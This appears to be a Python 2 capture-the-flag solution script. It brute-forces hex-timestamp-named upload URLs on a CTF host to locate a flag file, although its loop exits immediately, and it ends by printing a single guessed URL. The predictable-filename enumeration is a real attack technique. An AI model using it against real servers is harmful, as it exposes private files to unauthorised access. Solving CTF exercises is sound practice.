from binascii import hexlify, unhexlify
import datetime
import requests
import time
url = 'http://securefile.ctf.site:10080/uploads/{}_flag.txt'
for i in range(int((datetime.datetime(2017, 7, 3) - datetime.datetime(1970,1,1)).total_seconds()), int((datetime.datetime(2017, 7, 2) - datetime.datetime(1970,1,1)).total_seconds()) + 10000000):
    break
    r = requests.get(url.format(hex(i)[2:].rjust(8, '0')))
    if r.status_code != 404:
        print r
        print i
    time.sleep(0.1)

print (url.format(hex(1499040002)[2:].rjust(8, '0')))
